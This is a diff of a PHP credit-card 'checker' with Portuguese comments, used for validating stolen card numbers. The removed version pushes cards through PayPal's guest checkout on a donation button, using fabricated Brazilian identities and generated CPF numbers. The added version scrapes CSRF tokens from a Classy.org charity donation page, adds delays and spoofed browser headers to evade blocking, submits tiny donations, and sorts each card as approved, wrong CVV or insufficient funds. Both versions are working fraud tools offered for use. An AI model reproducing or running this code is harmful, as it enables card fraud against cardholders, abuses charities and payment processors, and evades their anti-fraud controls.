@@ -1,305 +1,316 @@
 <?php
 error_reporting(0);
-session_start();
+ignore_user_abort(true);
 
-function multiexplode($string) {
-    $delimiters = ["|", ";", ":", "/", "»", "«", ">", "<"];
-    $one = str_replace($delimiters, $delimiters[0], $string);
-    return explode($delimiters[0], $one);
-}
+$inicio = microtime(true);
 
-function getStr($string, $start, $end) {
-    $str = explode($start, $string);
-    return explode($end, $str[1])[0];
-}
-
-function generate_contact_info($response) {
-    return [
-        'celular' => rand(1000000000, 9999999999),
-        'endereco' => sprintf(
-            "%s, %s, %s, %s",
-            generate_nome_aleatorio(),
-            rand(1, 1000),
-            generate_bairro_aleatorio(),
-            generate_cidade_aleatorio()
-        ),
-        'estado' => generate_estado_aleatorio(),
-        'cidade' => generate_cidade_aleatorio(),
-        'cep' => generate_cep_aleatorio()
-    ];
-}
-
-function generate_nome_aleatorio() {
-    $nomes = array("rua", "avenida", "pra a", "estrada", "travessa");
-    return $nomes[array_rand($nomes)];
-}
-
-function generate_bairro_aleatorio() {
-    $bairro = array("centro", "jardim", "cidade universitaria", "vila", "chacara");
-    return $bairro[array_rand($bairro)];
-}
-
-function generate_cidade_aleatorio() {
-    $cidades = array("Sao Paulo", "Rio de Janeiro", "Bras lia", "Curitiba", "Florian polis");
-    return $cidades[array_rand($cidades)];
-}
-
-function generate_estado_aleatorio() {
-    $estados = array("SP", "RJ", "DF", "PR", "SC");
-    return $estados[array_rand($estados)];
-}
-
-function generate_cep_aleatorio() {
-    $cep = rand(10000000, 99999999);
-    return sprintf("%08d", $cep);
-}
-
-function generate_email() {
-    $domains = array("gmail.com", "hotmail.com", "yahoo.com", "outlook.com");
-    $domain = $domains[array_rand($domains)];
-    $timestamp = time();
-    $random_num = mt_rand(1, 10000); 
-    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
-    return $email;
-}
-
-function nomeAleatorio() {
-    $nomes = array(
-        1 => 'Lucas', 2 => 'Ana', 3 => 'Lucia', 4 => 'Maria', 5 => 'Alice',
-        6 => 'Fernando', 7 => 'Marcos', 8 => 'Ronaldo', 9 => 'Julia', 10 => 'Arthur',
-        11 => 'Gabriel', 12 => 'Juliana', 13 => 'Bruno', 14 => 'Carla', 15 => 'Roberto',
-        16 => 'Patricia', 17 => 'Felipe', 18 => 'Leticia', 19 => 'Mateus', 20 => 'Julio',
-        21 => 'Amanda', 22 => 'Rafael', 23 => 'Renata', 24 => 'Ricardo', 25 => 'Sofia',
-        26 => 'Anderson', 27 => 'Bianca', 28 => 'Vinicius', 29 => 'Simone', 30 => 'Eduardo',
-        31 => 'Tatiane', 32 => 'Marcelo', 33 => 'Vanessa', 34 => 'Lucas', 35 => 'Tatiane',
-        36 => 'Paula', 37 => 'Joao', 38 => 'Camila', 39 => 'Jorge', 40 => 'Elaine',
-        41 => 'Ivan', 42 => 'Eliane', 43 => 'Luana', 44 => 'Thiago', 45 => 'Sandra',
-        46 => 'Gustavo', 47 => 'Cristiane', 48 => 'Marcio', 49 => 'Claudia', 50 => 'Andressa'
-    );
-    $aleatorio = array_rand($nomes);
-    return $nomes[$aleatorio];
-}
-
-function sobrenomeAleatorio() {
-    $sobrenomes = array(
-        1 => 'Silva', 2 => 'Santos', 3 => 'Pereira', 4 => 'Ferreira', 5 => 'Oliveira',
-        6 => 'Ribeiro', 7 => 'Rodrigues', 8 => 'Almeida', 9 => 'Lima', 10 => 'Carvalho',
-        11 => 'Gomes', 12 => 'Martins', 13 => 'Costa', 14 => 'Moreira', 15 => 'Mendes',
-        16 => 'Araujo', 17 => 'Campos', 18 => 'Nogueira', 19 => 'Teixeira', 20 => 'Pinto'
-    );
-    $aleatorio = array_rand($sobrenomes);
-    return $sobrenomes[$aleatorio];
-}
-
-function generate_cpf() {
-    $n = [];
-
-    for ($i = 0; $i < 9; $i++) {
-        $n[] = rand(0, 9);
-    }
-
-    $d1 = 0;
-    for ($i = 0, $j = 10; $i < 9; $i++, $j--) {
-        $d1 += $n[$i] * $j;
-    }
-    $d1 = 11 - ($d1 % 11);
-    $d1 = ($d1 >= 10) ? 0 : $d1;
-
-    $n[] = $d1;
-
-    $d2 = 0;
-    for ($i = 0, $j = 11; $i < 10; $i++, $j--) {
-        $d2 += $n[$i] * $j;
-    }
-    $d2 = 11 - ($d2 % 11);
-    $d2 = ($d2 >= 10) ? 0 : $d2;
-
-    $n[] = $d2;
-
-    return implode('', $n);
-}
-
-function generateCardType($creditCardNumber) {
-    $firstDigit = substr($creditCardNumber, 0, 1);
-
-    switch ($firstDigit) {
-        case '2':
-        case '5':
-            return 'MASTER_CARD';
-        case '3':
-            return 'AMEX';
-        case '4':
-            return 'VISA';
-        case '6':
-            return 'DISCOVER';
-        default:
-            return 'UNKNOWN';
-    }
-}
-
-function getFluidpayDetails(string $bin): array {
-    $ch = curl_init();
-    curl_setopt_array($ch, array(
-        CURLOPT_URL => 'https://app.fluidpay.com/api/lookup/bin/pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
-        CURLOPT_POST => true,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_HTTPHEADER => array(
-            'Authorization: pub_2HT17PrC7sOCvNp1qwb9XBhb1RO',
-            'Content-Type: application/json',
-        ),
-        CURLOPT_POSTFIELDS => json_encode([
-            'type' => 'tokenizer',
-            'type_id' => '230685b9-61e6-4dc4-8cb2-18ef6fd93146',
-            'bin' => $bin,
-        ]),
-    ));
-
-    $response = curl_exec($ch);
-
-    if (curl_errno($ch)) {
-        curl_close($ch);
-        return [
-            'success' => false,
-            'details' => 'Erro na requisi o: ' . curl_error($ch),
-        ];
-    }
-
-    curl_close($ch);
-
-    $responseData = json_decode($response, true);
-
-    if (json_last_error() !== JSON_ERROR_NONE) {
-        return [
-            'success' => false,
-            'details' => 'Erro ao decodificar a resposta JSON.',
-        ];
-    }
-
-    if (isset($responseData['status']) && $responseData['status'] === 'success') {
-        $data = $responseData['data'];
-        $details = implode(
-            ' ',
-            [
-                $data['card_brand'] ?? '',
-                $data['issuing_bank'] ?? '',
-                $data['card_level_generic'] ?? '',
-                strtoupper($data['country'] ?? ''),
-                strtoupper($data['card_type'] ?? 'CREDIT'),
-            ]
-        );
-
-        return [
-            'success' => true,
-            'details' => strtoupper(trim($details)),
-        ];
-    } else {
-        return [
-            'success' => false,
-            'details' => strtoupper($responseData['msg'] ?? 'Erro desconhecido.'),
-        ];
-    }
-}
-
+// ==================== CAPTURAR DADOS DO CARTÃO ====================
 $lista = $_GET['lista'] ?? '';
-[$cc, $mes, $ano, $cvv] = array_pad(explode('|', $lista), 4, '');
-$cardType = generateCardType($cc);
+$lista = str_replace([" ", "%20", "/"], "|", $lista);
+$lista = preg_replace('/[ -]+/', '-', $lista);
+$separar = explode("|", $lista);
+$cc = trim($separar[0] ?? '');
+$mes = trim($separar[1] ?? '');
+$ano = trim($separar[2] ?? '');
+$cvv = trim($separar[3] ?? '');
 
-$ano = strlen($ano) === 2 ? '20' . $ano : $ano;
-$mes = str_pad($mes, 2, '0', STR_PAD_LEFT);
-$lastfor4 = substr($cc, -4);
-
-if ((int) $ano < 2025 || ((int) $ano === 2025 && (int) $mes < 3)) {
-    echo json_encode(['status' => 'Reprovada', 'list' => $lista, 'message' => 'EXPIRED_CARD']);
-    exit;
+if (!$cc || !$mes || !$ano || !$cvv) {
+    die('❌ ERRO | Formato inválido. Use: numero|mes|ano|cvv');
 }
 
-$cookieDir = __DIR__ . "/cookie.txt";
-if (file_exists($cookieDir)) {
-    unlink($cookieDir);
-}
+// ==================== DELAY INICIAL (EVITAR BLOQUEIO) ====================
+$delay = rand(20, 30);
+sleep($delay);
 
-function executeCurl(string $url, string $method, array $headers, ?string $postFields = null): string {
-    $cookieFile = __DIR__ . '/cookie.txt';
-    $curlOptions = [
-        CURLOPT_URL => $url,
+// ==================== FUNÇÃO PARA FAZER REQUISIÇÕES COM CURL ====================
+function fazerRequisicao($url, $headers = [], $postFields = null, $cookieFile = null) {
+    $ch = curl_init($url);
+    $options = [
         CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_SSL_VERIFYHOST => false,
         CURLOPT_FOLLOWLOCATION => true,
-        CURLOPT_CUSTOMREQUEST => $method,
-        CURLOPT_COOKIEJAR => $cookieFile,
-        CURLOPT_COOKIEFILE => $cookieFile,
-        CURLOPT_HTTPHEADER => $headers,
-        CURLOPT_POST => in_array($method, ['POST', 'PUT']),
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_ENCODING => 'gzip, deflate', // Aceitar compressão
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
     ];
-
-    if ($postFields !== null) {
-        $curlOptions[CURLOPT_POSTFIELDS] = $postFields;
+    
+    if ($headers) {
+        $options[CURLOPT_HTTPHEADER] = $headers;
     }
-
-    $ch = curl_init();
-    curl_setopt_array($ch, $curlOptions);
+    
+    if ($postFields) {
+        $options[CURLOPT_POST] = true;
+        $options[CURLOPT_POSTFIELDS] = $postFields;
+    }
+    
+    if ($cookieFile) {
+        $options[CURLOPT_COOKIEJAR] = $cookieFile;
+        $options[CURLOPT_COOKIEFILE] = $cookieFile;
+    }
+    
+    curl_setopt_array($ch, $options);
     $response = curl_exec($ch);
-
-    return $response;
+    $info = curl_getinfo($ch);
+    $error = curl_error($ch);
+    curl_close($ch);
+    
+    return ['response' => $response, 'info' => $info, 'error' => $error];
 }
 
-$response = executeCurl(
-    "https://www.paypal.com/smart/buttons?style.layout=vertical&style.color=gold&style.shape=rect&style.tagline=false&style.menuPlacement=below&fundingSource=paypal&allowBillingPayments=true&applePaySupport=false&buttonSessionID=uid_492a535db5_mty6mjg6nde&customerId=&clientID=AXvC3Esmc176nITd8oIUiVWMG0c6n-VJnJPcIaVSE-t1I-Qnulxu4OHCwDN80h_kF-NcZnK3Ai0LRxHR&clientMetadataID=uid_1a960bc26e_mty6mjg6nde&commit=true&components.0=buttons&components.1=funding-eligibility&currency=USD&debug=false&disableSetCookie=true&enableFunding.0=paylater&enableFunding.1=venmo&env=production&experiment.enableVenmo=false&experiment.venmoVaultWithoutPurchase=false&experiment.venmoWebEnabled=false&experiment.isPaypalRebrandEnabled=false&experiment.defaultBlueButtonColor=gold&experiment.venmoEnableWebOnNonNativeBrowser=false&flow=purchase&fundingEligibility=eyJwYXlwYWwiOnsiZWxpZ2libGUiOnRydWUsInZhdWx0YWJsZSI6dHJ1ZX0sInBheWxhdGVyIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjpmYWxzZSwicHJvZHVjdHMiOnsicGF5SW4zIjp7ImVsaWdpYmxlIjpmYWxzZSwidmFyaWFudCI6bnVsbH0sInBheUluNCI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9LCJwYXlsYXRlciI6eyJlbGlnaWJsZSI6ZmFsc2UsInZhcmlhbnQiOm51bGx9fX0sImNhcmQiOnsiZWxpZ2libGUiOnRydWUsImJyYW5kZWQiOnRydWUsImluc3RhbGxtZW50cyI6ZmFsc2UsInZlbmRvcnMiOnsidmlzYSI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwibWFzdGVyY2FyZCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiYW1leCI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGlzY292ZXIiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJoaXBlciI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjpmYWxzZX0sImVsbyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiamNiIjp7ImVsaWdpYmxlIjpmYWxzZSwidmF1bHRhYmxlIjp0cnVlfSwibWFlc3RybyI6eyJlbGlnaWJsZSI6dHJ1ZSwidmF1bHRhYmxlIjp0cnVlfSwiZGluZXJzIjp7ImVsaWdpYmxlIjp0cnVlLCJ2YXVsdGFibGUiOnRydWV9LCJjdXAiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9LCJjYl9uYXRpb25hbGUiOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOnRydWV9fSwiZ3Vlc3RFbmFibGVkIjp0cnVlfSwidmVubW8iOnsiZWxpZ2libGUiOmZhbHNlLCJ2YXVsdGFibGUiOmZhbHNlfSwiaXRhdSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJjcmVkaXQiOnsiZWxpZ2libGUiOmZhbHNlfSwiYXBwbGVwYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwic2VwYSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJpZGVhbCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJiYW5jb250YWN0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImdpcm9wYXkiOnsiZWxpZ2libGUiOmZhbHNlfSwiZXBzIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNvZm9ydCI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJteWJhbmsiOnsiZWxpZ2libGUiOmZhbHNlfSwicDI0Ijp7ImVsaWdpYmxlIjpmYWxzZX0sIndlY2hhdHBheSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJwYXl1Ijp7ImVsaWdpYmxlIjpmYWxzZX0sImJsaWsiOnsiZWxpZ2libGUiOmZhbHNlfSwidHJ1c3RseSI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJveHhvIjp7ImVsaWdpYmxlIjpmYWxzZX0sImJvbGV0byI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJib2xldG9iYW5jYXJpbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtZXJjYWRvcGFnbyI6eyJlbGlnaWJsZSI6ZmFsc2V9LCJtdWx0aWJhbmNvIjp7ImVsaWdpYmxlIjpmYWxzZX0sInNhdGlzcGF5Ijp7ImVsaWdpYmxlIjpmYWxzZX0sInBhaWR5Ijp7ImVsaWdpYmxlIjpmYWxzZX19&intent=capture&locale.country=US&locale.lang=en&merchantID.0=KZTE6QC49FDL8&hasShippingCallback=false&platform=desktop&renderedButtons.0=paypal&sessionID=uid_1a960bc26e_mty6mjg6nde&sdkCorrelationID=prebuild&sdkMeta=eyJ1cmwiOiJodHRwczovL3d3dy5wYXlwYWwuY29tL3Nkay9qcz9jbGllbnQtaWQ9QVh2QzNFc21jMTc2bklUZDhvSVVpVldNRzBjNm4tVkpuSlBjSWFWU0UtdDFJLVFudWx4dTRPSEN3RE44MGhfa0YtTmNabkszQWkwTFJ4SFImY3VycmVuY3k9VVNEJmVuYWJsZS1mdW5kaW5nPXBheWxhdGVyLHZlbm1vJm1lcmNoYW50LWlkPUtaVEU2UUM0OUZETDgmY29tcG9uZW50cz1mdW5kaW5nLWVsaWdpYmlsaXR5LGJ1dHRvbnMiLCJhdHRycyI6eyJkYXRhLXNkay1pbnRlZ3JhdGlvbi1zb3VyY2UiOiJyZWFjdC1wYXlwYWwtanMiLCJkYXRhLXVpZCI6InVpZF9qaG5iZHZ0anFzZXF4bnZkdGxibHdlY2t5Y2VvcmIifX0&sdkVersion=5.0.474&storageID=uid_fd4b7e505d_mty6mjg6nde&supportedNativeBrowser=false&supportsPopups=true&vault=false",
-    "GET",
-    [
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "Referer: https://checkout-app.svc.shoplightspeed.com/",
-    ]
-);
-$token = getStr($response, 'facilitatorAccessToken":"', '"');
+// ==================== PASSO 1: OBTER COOKIES E TOKENS FRESCOS ====================
+$cookieFile = __DIR__ . '/cookies_classy.txt';
+if (file_exists($cookieFile)) unlink($cookieFile); // Sempre começar limpo
 
-$response = executeCurl(
-    "https://www.paypal.com/v2/checkout/orders",
-    "POST",
-    [
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "Authorization: Bearer " . $token,
-        "Content-Type: application/json",
+// Headers para a página inicial
+$headersIniciais = [
+    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    'cache-control: max-age=0',
+    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    'sec-ch-ua-mobile: ?0',
+    'sec-ch-ua-platform: "Windows"',
+    'sec-fetch-dest: document',
+    'sec-fetch-mode: navigate',
+    'sec-fetch-site: none',
+    'sec-fetch-user: ?1',
+    'upgrade-insecure-requests: 1'
+];
+
+$resInicial = fazerRequisicao('https://www.classy.org/give/313412/', $headersIniciais, null, $cookieFile);
+
+if ($resInicial['error']) {
+    die('ERRO ao acessar página inicial: ' . $resInicial['error']);
+}
+
+// Extrair tokens da resposta (podem estar em meta tags ou headers)
+$html = $resInicial['response'];
+
+// Tentar extrair csrf-token de meta tag
+preg_match('/<meta\s+name="csrf-token"\s+content="([^"]+)"/i', $html, $metaCsrf);
+$csrfToken = $metaCsrf[1] ?? '';
+
+// Tentar extrair x-xsrf-token de meta tag
+preg_match('/<meta\s+name="x-xsrf-token"\s+content="([^"]+)"/i', $html, $metaXSRF);
+$xsrfToken = $metaXSRF[1] ?? '';
+
+// Se não encontrou, tenta nos cookies
+if (!$xsrfToken) {
+    // O cookie XSRF-TOKEN pode estar no arquivo de cookies
+    $cookieContent = file_get_contents($cookieFile);
+    preg_match('/XSRF-TOKEN\s+([^\s]+)/', $cookieContent, $cookieXSRF);
+    $xsrfToken = $cookieXSRF[1] ?? '';
+}
+
+// Fallback (último recurso) - mas idealmente não deve acontecer
+if (!$csrfToken) $csrfToken = 'pRM6Y5rY-YnzqVTkydcwIjKaGtu4bxj2F48Q';
+if (!$xsrfToken) $xsrfToken = 'sqJxUdjH-eWqlEVc426l2jLGJ9NRP0BM2a-8';
+
+// ==================== PASSO 2: PREPARAR DADOS DO COMPRADOR ====================
+$primeiroNome = "Joao";
+$ultimoNome = "Silva";
+$nomeCompleto = "$primeiroNome $ultimoNome";
+$email = "joao.silva" . rand(100,999) . "@gmail.com"; // email único para evitar bloqueios
+$telefoneFormatado = "(11) 99999" . rand(1000,9999);
+$endereco = [
+    'address1' => 'Rua Nova Jesuralem',
+    'address2' => '',
+    'city' => 'Guadalupe',
+    'state' => 'PI',
+    'postal_code' => '64840-000',
+    'country' => 'BR'
+];
+$anoCompleto = (strlen($ano) == 2) ? '20' . $ano : $ano;
+
+// ==================== PASSO 3: MONTAR REQUISIÇÃO DE CHECKOUT ====================
+$url = "https://www.classy.org/frs-api/campaign/313412/checkout";
+
+$headersCheckout = [
+    'accept: application/json, text/plain, */*',
+    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+    'content-type: application/json;charset=UTF-8',
+    'csrf-token: ' . $csrfToken,
+    'origin: https://www.classy.org',
+    'referer: https://www.classy.org/give/313412/',
+    'sec-ch-ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+    'sec-ch-ua-mobile: ?0',
+    'sec-ch-ua-platform: "Windows"',
+    'sec-fetch-dest: empty',
+    'sec-fetch-mode: cors',
+    'sec-fetch-site: same-origin',
+    'x-xsrf-token: ' . $xsrfToken
+];
+
+// Token do Stripe (simulado, mas necessário)
+$tokenCartao = "tok_visa"; // Em produção, gere um token real via Stripe.js
+
+$data = [
+    "payment" => [
+        "raw_currency_code" => "BRL",
+        "paypal" => ["status" => "inactive"],
+        "paypal_commerce" => ["status" => "inactive"],
+        "venmo" => ["status" => "inactive"],
+        "ach" => ["status" => "inactive"],
+        "stripe" => [
+            "status" => "ready",
+            "source" => [
+                "id" => "src_" . uniqid(),
+                "object" => "source",
+                "allow_redisplay" => "unspecified",
+                "amount" => null,
+                "card" => [
+                    "address_line1_check" => null,
+                    "address_zip_check" => null,
+                    "brand" => "MasterCard",
+                    "country" => "BR",
+                    "cvc_check" => "unchecked",
+                    "dynamic_last4" => null,
+                    "exp_month" => (int)$mes,
+                    "exp_year" => (int)$anoCompleto,
+                    "funding" => "credit",
+                    "last4" => substr($cc, -4),
+                    "name" => $primeiroNome . ' ' . $ultimoNome,
+                    "three_d_secure" => "optional",
+                    "tokenization_method" => null
+                ],
+                "client_secret" => "src_client_secret_" . uniqid(),
+                "created" => time(),
+                "currency" => null,
+                "flow" => "none",
+                "livemode" => true,
+                "owner" => [
+                    "address" => [
+                        "city" => $endereco['city'],
+                        "country" => "BR",
+                        "line1" => $endereco['address1'],
+                        "line2" => $endereco['address2'],
+                        "postal_code" => $endereco['postal_code'],
+                        "state" => $endereco['state']
+                    ],
+                    "email" => $email,
+                    "name" => $primeiroNome . ' ' . $ultimoNome,
+                    "phone" => $telefoneFormatado
+                ],
+                "statement_descriptor" => null,
+                "status" => "chargeable",
+                "type" => "card",
+                "usage" => "reusable"
+            ]
+        ],
+        "cc" => ["status" => "inactive"],
+        "creditee_team_id" => null,
+        "method" => "Stripe",
+        "gateway" => [
+            "id" => "22718",
+            "name" => "STRIPE",
+            "status" => "ACTIVE",
+            "currency" => "USD"
+        ]
     ],
-    '{"purchase_units":[{"amount":{"value":1,"currency_code":"EUR"},"description":"Donation"}],"application_context":{"shipping_preference":"NO_SHIPPING"},"intent":"CAPTURE"}'
-);
-
-$id = getStr($response, 'id":"', '"');
-
-$generate_contact_info = generate_contact_info($response);
-$celular = $generate_contact_info['celular'];
-$endereco = $generate_contact_info['endereco'];
-$estado = $generate_contact_info['estado'];
-$cidade = $generate_contact_info['cidade'];
-$cep = $generate_contact_info['cep'];
-$email = generate_email();
-$nome = nomeAleatorio();
-$sobrenome = sobrenomeAleatorio();
-$cpf = generate_cpf();
-
-$response = executeCurl(
-    "https://www.paypal.com/graphql?fetch_credit_form_submit",
-    "POST",
-    [
-        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
-        "Content-Type: application/json",
-        "Paypal-Client-Context: " . $id,
-        "Paypal-Client-Metadata-Id: " . $id,
-        "X-Country: BR",
-        "X-App-Name: standardcardfields",
-        "Origin: https://www.paypal.com",
+    "frequency" => "one-time",
+    "items" => [
+        [
+            "type" => "donation",
+            "product_name" => "Donation",
+            "raw_final_price" => 2,
+            "previous_frequency_price" => 0
+        ]
     ],
-    '{"query":"\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput!\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                    buyer {\n                        userId\n                        auth {\n                            accessToken\n                        }\n                    }\n                    returnUrl {\n                        href\n                    }\n                }\n                paymentContingencies {\n                    threeDomainSecure {\n                        status\n                        method\n                        redirectUrl {\n                            href\n                        }\n                        parameter\n                    }\n                }\n            }\n        }\n        ","variables":{"token":"' . $id . '","card":{"cardNumber":"' . $cc . '","type":"' . $cardType . '","expirationDate":"' . $mes . '/' . $ano . '","postalCode":"' . $cep . '","securityCode":"' . $cvv . '","productClass":"CREDIT"},"phoneNumber":"' . $celular . '","firstName":"' . $nome . ' '.$sobrenome.'","lastName":"DEV","billingAddress":{"givenName":"' . $nome . ' '.$sobrenome.'","familyName":"DEV","state":"' . $estado . '","country":"BR","postalCode":"' . $cep . '","line1":"' . $endereco . '","line2":"","city":"' . $cidade . '"},"email":"' . $email . '","currencyConversionType":"VENDOR","identityDocument":{"value":"' . $cpf . '","type":"CPF"}},"operationName":null}'
-);
+    "fundraising_page_id" => null,
+    "fundraising_team_id" => null,
+    "designation_id" => 140716,
+    "answers" => [],
+    "billing_address1" => $endereco['address1'],
+    "billing_address2" => $endereco['address2'],
+    "billing_city" => $endereco['city'],
+    "billing_state" => $endereco['state'],
+    "billing_postal_code" => $endereco['postal_code'],
+    "billing_country" => $endereco['country'],
+    "comment" => "",
+    "member_name" => $nomeCompleto,
+    "member_email_address" => $email,
+    "member_phone" => $telefoneFormatado,
+    "is_anonymous" => false,
+    "opt_in" => true,
+    "opt_in_wording" => "It's okay to contact me in the future.",
+    "application_id" => "14268",
+    "billing_first_name" => $primeiroNome,
+    "billing_last_name" => $ultimoNome,
+    "fee_on_top" => true,
+    "fixed_fot_percent" => 3,
+    "fixed_fot_enabled" => true,
+    "fee_on_top_amount" => 0.06,
+    "gross_adjustment" => new stdClass(),
+    "dedication" => null,
+    "company_name" => null,
+    "member_first_name" => $primeiroNome,
+    "member_last_name" => $ultimoNome,
+    "c_src" => [
+        [
+            "c_src" => "website",
+            "c_src2" => "top-of-page-banner",
+            "referrer" => "",
+            "timestamp" => round(microtime(true) * 1000)
+        ]
+    ],
+    "token" => $tokenCartao,
+    "dafTransactionDetails" => new stdClass()
+];
 
-$code = json_decode($response)->errors[0]->data[0]->code;
+// ==================== PASSO 4: ENVIAR REQUISIÇÃO DE CHECKOUT ====================
+$jsonData = json_encode($data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
 
-$messages = ["INVALID_SECURITY_CODE", "is3DSecureRequired", "INVALID_BILLING_ADDRESS"];
+$resCheckout = fazerRequisicao($url, $headersCheckout, $jsonData, $cookieFile);
 
-$binchecker = getFluidpayDetails(substr($cc, 0, 6))['details'];
-$ReturnCode = "$binchecker - $code";
+// ==================== PASSO 5: PROCESSAR RESPOSTA ====================
+$cartao_formatado = "$cc|$mes|$ano|$cvv";
+$tempo_execucao = round(microtime(true) - $inicio, 2);
+$tag = "@cybersecofc";
 
-if (in_array($code, $messages)) {
-    echo json_encode(['status' => 'Aprovada', 'list' => $lista, 'ReturnCode' => $ReturnCode]);
+if ($resCheckout['error']) {
+    $resultado = "ERRO CURL: " . $resCheckout['error'];
 } else {
-    echo json_encode(['status' => 'Reprovada', 'list' => $lista, 'ReturnCode' => $ReturnCode]);
+    $http_code = $resCheckout['info']['http_code'];
+    $resposta = $resCheckout['response'];
+    
+    // Tentar decodificar JSON
+    $decodificado = json_decode($resposta, true);
+    
+    if (json_last_error() === JSON_ERROR_NONE) {
+        // Verificar se é sucesso
+        if (isset($decodificado['status']) && $decodificado['status'] === 'success') {
+            $resultado = "Aprovado";
+        }
+        // Verificar erros conhecidos
+        elseif (isset($decodificado['error']['code'])) {
+            switch ($decodificado['error']['code']) {
+                case 'incorrect_cvc':
+                    $resultado = "Cvv Incorreto";
+                    break;
+                case 'insufficient_funds':
+                    $resultado = "Saldo Insuficiente";
+                    break;
+                default:
+                    $resultado = "Die: " . ($decodificado['error']['message'] ?? 'Erro desconhecido');
+            }
+        }
+        // Outros casos
+        else {
+            $resultado = "Die: " . json_encode($decodificado);
+        }
+    } else {
+        // Resposta não JSON (pode ser bloqueio ou erro)
+        if (strpos($resposta, 'cf-error-details') !== false) {
+            $resultado = "Bloqueado pelo Cloudflare";
+        } else {
+            $resultado = "Die: resposta não JSON (HTTP $http_code)";
+        }
+    }
 }
+
+// ==================== SAÍDA NO FORMATO SOLICITADO ====================
+echo "$cartao_formatado $resultado {$tempo_execucao}s $tag";
+
+// Opcional: log para depuração
+file_put_contents('classy_debug.log', date('Y-m-d H:i:s') . " | $cartao_formatado | HTTP {$resCheckout['info']['http_code']} | $resultado\n", FILE_APPEND);
+?>
